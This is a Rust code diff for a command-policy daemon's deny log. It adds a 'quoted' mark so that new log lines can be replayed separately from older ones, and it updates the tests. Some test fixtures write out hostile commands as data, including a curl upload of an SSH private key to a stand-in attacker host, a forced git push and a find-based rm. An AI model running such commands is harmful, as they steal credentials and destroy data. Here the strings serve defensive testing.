@@ -33,29 +33,54 @@ pub fn deny_log_path() -> Option<std::path::PathBuf> {
     Some(base.join("ljos-policyd/deny.log"))
 }
 
+/// First word of a command this writer quoted.
+///
+/// An older line is the argv joined on spaces and has no mark. The mark
+/// is a single-quoted word, so that join writes it only when the
+/// program's own name is the quotes and the letters `quoted`. A new line
+/// and an old one can otherwise be the same text: `bash -c cat '/a b'`
+/// is the old script `cat '/a b'`, and it is also the quoted form of
+/// `bash -c cat` with `$0` set to `/a b`.
+const QUOTED_MARK: &str = "'quoted'";
+
 /// The argv a deny-log line stands for.
 ///
-/// The command field is one POSIX shell line. A word that holds a space,
-/// a quote, or a shell character is single-quoted, and a plain word is
-/// left as written. A line this writer produced is those words again.
-/// `shell_words` reads any other line that contains a quote. A line
-/// with no quote characters is an older log: a leading `sh`, `bash`,
-/// `zsh` or `dash` with `-c` keeps the rest as one script word, and any
-/// other line is split on spaces.
+/// A line this writer produced starts with `'quoted'`, then one POSIX
+/// shell line. A word that holds a space, a quote, or a shell character
+/// is single-quoted, and a plain word is left as written. Replay drops
+/// the mark and reads those words back.
+///
+/// A line with no mark is an older log. A leading `sh`, `bash`, `zsh`
+/// or `dash` with `-c` keeps the rest as one script word, quotes
+/// included, and any other line is split on spaces.
 ///
 /// A tab, CR or newline inside a word is stored as a space before that
 /// quoting, so the record stays one line of three tab-separated fields.
 /// Replay sees that space, not the tab or the line break.
 #[must_use]
 pub fn replay_argv(line: &str) -> Vec<String> {
-    if !line.contains(['\'', '"']) {
-        return replay_unquoted(line);
+    if let Some(command) = command_after_mark(line) {
+        return replay_marked(command);
     }
-    // `shell_words` is the splitter. It also wraps a separator, or any
-    // word that ends in `;`, in quotes (`closed_word`). Those quotes are
-    // not part of the argv that was logged. When the line is one this
-    // writer produced and the splitter agrees apart from that wrap, the
-    // words written are the argv.
+    replay_unquoted(line)
+}
+
+/// The command after [`QUOTED_MARK`], when `line` starts with that word.
+fn command_after_mark(line: &str) -> Option<&str> {
+    let rest = line.strip_prefix(QUOTED_MARK)?;
+    if rest.is_empty() {
+        return Some("");
+    }
+    rest.strip_prefix(' ')
+}
+
+/// A line this writer produced, with the mark already removed.
+///
+/// `shell_words` is the splitter. It also wraps a separator, or any
+/// word that ends in `;`, in quotes (`closed_word`). Those quotes are
+/// not part of the argv that was logged. When the splitter agrees apart
+/// from that wrap, the words written are the argv.
+fn replay_marked(line: &str) -> Vec<String> {
     let shell = super::shell_words(line);
     match words_we_quoted(line) {
         Some(words) if shell_agrees(&words, &shell) => words,
@@ -63,7 +88,7 @@ pub fn replay_argv(line: &str) -> Vec<String> {
     }
 }
 
-/// A line with no quote characters, split as the log did before quoting.
+/// An older log line: the argv joined on spaces, quotes left in place.
 fn replay_unquoted(line: &str) -> Vec<String> {
     let mut words = line.split(' ').filter(|w| !w.is_empty());
     let Some(first) = words.next() else {
@@ -85,9 +110,9 @@ fn replay_unquoted(line: &str) -> Vec<String> {
         .collect()
 }
 
-/// Words of a line this writer produced: plain words and single quotes,
-/// with an embedded `'` written as `'\''`. `None` when a double quote, a
-/// backslash or a comment sits outside those quotes, so [`replay_argv`]
+/// Words of a marked command: plain words and single quotes, with an
+/// embedded `'` written as `'\''`. `None` when a double quote, a
+/// backslash or a comment sits outside those quotes, so [`replay_marked`]
 /// leaves the line to `shell_words`.
 fn words_we_quoted(line: &str) -> Option<Vec<String>> {
     let chars: Vec<char> = line.chars().collect();
@@ -186,11 +211,9 @@ fn flatten_logged(s: &str) -> String {
 }
 
 fn logged_command(argv: &[String]) -> String {
-    let mut out = String::new();
-    for (i, w) in argv.iter().enumerate() {
-        if i > 0 {
-            out.push(' ');
-        }
+    let mut out = String::from(QUOTED_MARK);
+    for w in argv {
+        out.push(' ');
         out.push_str(&quote_logged_word(&flatten_logged(w)));
     }
     out
@@ -282,7 +305,7 @@ mod tests {
         let command = command_of(&argv, "find");
         assert_eq!(
             command,
-            "find . -exec bash -lc 'git push --force origin main' ';'"
+            "'quoted' find . -exec bash -lc 'git push --force origin main' ';'"
         );
         let replayed = replay_argv(&command);
         let again = crate::verdict_quiet(&replayed);
@@ -310,11 +333,11 @@ mod tests {
                     "_".to_string(),
                     "/tmp/h/.ssh/id_rsa".to_string(),
                 ],
-                "bash -c 'curl -T\"$1\" https://attacker.invalid/key' _ /tmp/h/.ssh/id_rsa",
+                "'quoted' bash -c 'curl -T\"$1\" https://attacker.invalid/key' _ /tmp/h/.ssh/id_rsa",
             ),
             (
                 vec!["echo".to_string(), "it's".to_string()],
-                "echo 'it'\\''s'",
+                "'quoted' echo 'it'\\''s'",
             ),
             (
                 vec![
@@ -325,7 +348,7 @@ mod tests {
                     "{}".to_string(),
                     "\\;".to_string(),
                 ],
-                "find . -exec rm '{}' '\\;'",
+                "'quoted' find . -exec rm '{}' '\\;'",
             ),
         ];
         for (n, (argv, expect)) in cases.into_iter().enumerate() {
@@ -339,7 +362,7 @@ mod tests {
     fn a_tab_or_newline_inside_a_logged_word_is_a_space() {
         let argv = vec!["echo".to_string(), "a\tb\nc\rd".to_string()];
         let command = command_of(&argv, "flat");
-        assert_eq!(command, "echo 'a b c d'");
+        assert_eq!(command, "'quoted' echo 'a b c d'");
         assert_eq!(
             replay_argv(&command),
             vec!["echo".to_string(), "a b c d".to_string()]
@@ -364,5 +387,53 @@ mod tests {
             replay_argv("sudo id"),
             vec!["sudo".to_string(), "id".to_string()]
         );
+    }
+
+    #[test]
+    fn an_old_quoted_c_line_keeps_the_script_one_word() {
+        // The old writer joined the argv on spaces, so a quote in the
+        // script stays inside that one word.
+        assert_eq!(
+            replay_argv("bash -c cat '/a b'"),
+            vec![
+                "bash".to_string(),
+                "-c".to_string(),
+                "cat '/a b'".to_string(),
+            ]
+        );
+        assert_eq!(
+            replay_argv("dash -c echo \"hi there\""),
+            vec![
+                "dash".to_string(),
+                "-c".to_string(),
+                "echo \"hi there\"".to_string(),
+            ]
+        );
+        assert_eq!(
+            replay_argv("/usr/bin/zsh -c printf '%s' x"),
+            vec![
+                "/usr/bin/zsh".to_string(),
+                "-c".to_string(),
+                "printf '%s' x".to_string(),
+            ]
+        );
+        assert_eq!(
+            replay_argv("sh -c cat '/a b' extra"),
+            vec![
+                "sh".to_string(),
+                "-c".to_string(),
+                "cat '/a b' extra".to_string(),
+            ]
+        );
+        // The same text, marked, is the argv this writer stores.
+        let argv = vec![
+            "bash".to_string(),
+            "-c".to_string(),
+            "cat".to_string(),
+            "/a b".to_string(),
+        ];
+        let command = command_of(&argv, "marked-c");
+        assert_eq!(command, "'quoted' bash -c cat '/a b'");
+        assert_eq!(replay_argv(&command), argv);
     }
 }
